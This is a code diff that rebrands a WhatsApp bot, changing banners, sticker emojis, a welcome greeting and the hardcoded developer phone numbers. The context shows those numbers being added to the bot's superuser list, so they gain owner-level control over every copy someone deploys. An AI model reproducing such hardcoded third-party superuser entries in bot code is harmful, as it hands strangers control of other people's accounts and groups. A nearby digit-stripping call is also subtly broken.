@@ -156,10 +156,10 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '255762190568';
-            const dj2 = '255762190568';
-            const dj3 = "255762190568";
-            const luffy = '255762190568';
+            const dj = '255768318788';
+            const dj2 = '255786535571';
+            const dj3 = "255768318788";
+            const luffy = '255768318788';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -167,7 +167,7 @@ setTimeout(() => {
             
             var dev = [dj, dj2,dj3,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
-            console.log("\t🌍BARAKA-MD-V2 ONLINE🌍");
+            console.log("\t✨ANDBAD PROJECT✨");
             console.log("=========== written message===========");
             if (verifGroupe) {
                 console.log("message provenant du groupe : " + nomGroupe);
@@ -380,7 +380,7 @@ function mybotpic() {
                         let stickerMess = new Sticker(data.url, {
                             pack: conf.NOM_OWNER,
                             type: StickerTypes.FULL,
-                            categories: ["🤩", "🎉"],
+                            categories: ["🦇", "👻"],
                             id: "12345",
                             quality: 70,
                             background: "transparent",
@@ -433,7 +433,7 @@ function mybotpic() {
                                         pack: 'Zoou-Md',
                                         author: conf.OWNER_NAME,
                                         type: StickerTypes.FULL,
-                                        categories: ['🤩', '🎉'],
+                                        categories: ['🦇', '👻'],
                                         id: '12345',
                                         quality: 50,
                                         background: '#000000'
@@ -531,7 +531,7 @@ function mybotpic() {
                 pack: 'Zokou-Md',
                 author: conf.OWNER_NAME,
                 type: StickerTypes.FULL,
-                categories: ['🤩', '🎉'],
+                categories: ['🦇', '👻'],
                 id: '12345',
                 quality: 50,
                 background: '#000000'
@@ -675,7 +675,7 @@ zk.ev.on('group-participants.update', async (group) => {
             let msg = `*BMW MD WELCOME MESSAGE*`;
             let membres = group.participants;
             for (let membre of membres) {
-                msg += ` \n❒ *Hey* 🖐️ @${membre.split("@")[0]} WELCOME TO OUR GROUP. \n\n`;
+                msg += ` \n❒ *Komasava* 👻 @${membre.split("@")[0]} WELCOME TO OUR GROUP. \n\n`;
             }
 
             msg += `❒ *READ THE GROUP DESCRIPTION TO AVOID GETTING REMOVED* `;
@@ -809,7 +809,7 @@ zk.ev.on('group-participants.update', async (group) => {
                 console.log("ℹ️ Baraka Md is connecting...");
             }
             else if (connection === 'open') {
-                console.log("✅ Baraka Md Connected to WhatsApp! ☺️");
+                console.log("✅ MR-ANDBAD-MD Connected to WhatsApp! ☺️");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
